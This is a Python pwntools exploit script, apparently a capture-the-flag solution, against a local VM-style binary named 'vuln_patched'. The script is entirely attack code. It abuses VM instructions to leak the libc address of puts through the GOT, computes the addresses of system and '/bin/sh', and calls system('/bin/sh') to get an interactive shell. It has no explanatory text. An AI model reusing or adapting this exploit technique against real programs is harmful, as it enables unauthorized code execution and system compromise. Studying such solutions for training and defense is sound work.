#!/usr/bin/env python3
from pwn import *

context(log_level="info", arch="amd64")

io = process("./vuln_patched")
# io = remote("localhost", 9999)
elf = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

OP_CONST = 0x3A
OP_ADD = 0x7E
OP_LOAD = 0x52
OP_STORE = 0xC4
OP_CALL = 0x1B


def cmd(c):
    io.sendlineafter(b"> ", c.encode())


def inst(op, *args):
    cmd(f"inst {op} " + " ".join(map(str, args)))


cmd("dbg")
io.recvuntil(b"[*] rand_slot = ")
rand_slot = int(io.recvline().strip())
log.success(f"rand_slot: {rand_slot}")

offset_puts = elf.got["puts"] - elf.symbols["values"]
offset_system = libc.symbols["system"] - libc.symbols["puts"]
offset_binsh = next(libc.search(b"/bin/sh\x00")) - libc.symbols["puts"]

inst(OP_CONST, 2, offset_puts)
inst(OP_ADD, 3, rand_slot, 2)
inst(OP_LOAD, 4, 3)
inst(OP_CONST, 5, offset_system)
inst(OP_ADD, 6, 4, 5)
inst(OP_CONST, 7, offset_binsh)
inst(OP_ADD, 8, 4, 7)
inst(OP_CONST, 9, 96)
inst(OP_ADD, 10, rand_slot, 9)
inst(OP_CONST, 12, 2)
inst(OP_STORE, 10, 12)
inst(OP_CALL, 6, 8)

cmd("run")
io.interactive()
